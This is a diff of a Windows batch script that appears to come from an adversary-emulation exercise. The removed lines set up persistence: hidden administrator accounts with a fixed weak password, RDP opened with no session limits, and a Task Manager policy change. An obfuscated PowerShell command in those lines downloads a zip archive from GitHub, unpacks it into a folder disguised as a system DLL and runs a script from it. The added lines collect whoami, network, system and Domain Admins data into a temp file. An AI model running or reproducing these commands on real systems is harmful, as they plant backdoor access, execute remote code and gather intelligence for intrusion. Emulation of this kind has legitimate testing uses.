@@ -1,31 +1,9 @@
-:: Disable guest user account
-net user Guest /active:no
-:: Modify account policy
-net accounts /forcelogoff:no /maxpwage:unlimited
-:: Create root user account
-net user root Password123! /add /active:"yes" /expires:"never" /passwordchg:"NO"
-net localgroup Administrators root /add
-net localgroup "Remote Desktop Users" root /add
-:: Create server user account
-net user server Password123! /add /active:"yes" /expires:"never" /passwordchg:"NO"
-net localgroup Administrators server /add
-net localgroup "Remote Desktop Users" server /add
-:: Change File System Permissions to Hide Accounts
-attrib  C:\users\root +r +a +s +h
-attrib  C:\users\server +r +a +s +h
-:: Hide Accounts from Logon Screen
-REG ADD "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v root /t REG_DWORD /d 0x0 /f
-REG ADD "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v server /t REG_DWORD /d 0x0 /f
-:: Modify Terminal Services Configurations
-reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
-reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
-reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxIdleTime" /t REG_DWORD /d 0x0 /f
-reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxDisconnectionTime" /t REG_DWORD /d 0x0 /f
-reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxConnectionTime" /t REG_DWORD /d 0x1 /f
-:: Disable Task Manager
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 0 /f
-:: Download additional staging
-powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBnAGEAcgByAGUAdAB0AG0AYwBjAGEAcgB0AGgALwB0AGUAcwB0AC8AcgBhAHcALwBtAGEAaQBuAC8AUwB0AGEAZwBpAG4AZwAuAHoAaQBwACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAUwB0AGEAZwBpAG4AZwAuAHoAaQBwACcAIAA7ACAARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBMAGkAdABlAHIAYQBsAFAAYQB0AGgAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAUwB0AGEAZwBpAG4AZwAuAHoAaQBwACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0ANgA0AFEALgBkAGwAbABcACcAIAA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAFMAdABhAGcAaQBuAGcALgB6AGkAcAAnAA==
-:: Execute start.cmd
-START C:\Windows\System64Q.dll\start.cmd
+@echo off
+REM Get current permission level.
+whoami
+REM Ping faux attack infrastructure.
+ping -n 1 8.8.8.8
+REM Collect system information into text file.
+netstat -rn >> C:\Users\%username%\AppData\Temp\a.txt
+systeminfo >> C:\Users\%username%\AppData\Temp\a.txt
+net group "Domain Admins" /domain >> C:\Users\%username%\AppData\Temp\a.txt
